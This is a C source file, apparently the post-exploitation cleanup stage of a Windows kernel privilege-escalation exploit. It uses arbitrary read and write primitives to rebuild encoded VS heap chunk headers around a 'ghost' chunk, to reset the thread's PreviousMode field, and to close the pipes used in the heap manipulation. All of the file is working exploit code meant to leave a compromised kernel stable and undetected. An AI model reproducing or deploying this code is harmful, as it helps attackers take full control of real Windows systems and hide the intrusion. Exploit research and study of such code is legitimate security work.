#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "core/cleanup.h"

#include "primitives/arbitrary_write.h"
#include "pipe_utils/pipe_utils.h"

int FixVsChunks(exploit_addresses_t* addrs)
{
    uint64_t new_header[2] = { 0 };

    uintptr_t previous_chunk = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
    printf("[*] Modifying previous_chunk: 0x%llX\n", previous_chunk);
    new_header[0] = Read64(previous_chunk);
    new_header[0] = new_header[0] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals;
    new_header[1] = Read64(previous_chunk + 0x8);
    new_header[1] = new_header[1] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals;

    HEAP_VS_CHUNK_HEADER* new_vs_header = (HEAP_VS_CHUNK_HEADER*)&new_header;
    new_vs_header->UnsafeSize = PREV_CHUNK_OFFSET / 0x10;

    Write64(previous_chunk, new_header[0] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals);
    Write64(previous_chunk + 0x8, new_header[1] ^ previous_chunk ^ addrs->RtlpHpHeapGlobals);

    uintptr_t next_chunk = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
    printf("[*] Modifying next_chunk: 0x%llX\n", next_chunk);
    new_header[0] = Read64(next_chunk);
    new_header[0] = new_header[0] ^ next_chunk ^ addrs->RtlpHpHeapGlobals;
    new_header[1] = Read64(next_chunk + 0x8);
    new_header[1] = new_header[1] ^ next_chunk ^ addrs->RtlpHpHeapGlobals;

    new_vs_header = (HEAP_VS_CHUNK_HEADER*)&new_header;
    new_vs_header->UnsafePrevSize = NEXT_CHUNK_OFFSET / 0x10;

    Write64(next_chunk, new_header[0] ^ next_chunk ^ addrs->RtlpHpHeapGlobals);
    Write64(next_chunk + 0x8, new_header[1] ^ next_chunk ^ addrs->RtlpHpHeapGlobals);

    return 1;
}

int RestorePreviousMode(exploit_addresses_t* addrs)
{
    puts("[*] Restoring PreviousMode to its original value (1)");
    char one = 0x01;
    ArbitraryWrite(addrs->self_kthread + KTHREAD_PREVIOUS_MODE_OFFSET, &one, sizeof(char));

    return 1;
}

int CleanupPipes(exploit_pipes_t* pipes)
{
    puts("[*] Cleaning up ghost pipe...");
    ClosePipePairHandles(&pipes->ghost_chunk_pipe);

    puts("[*] Cleaning up previous pipe...");
    ClosePipePairHandles(&pipes->previous_chunk_pipe);

    return 1;
}
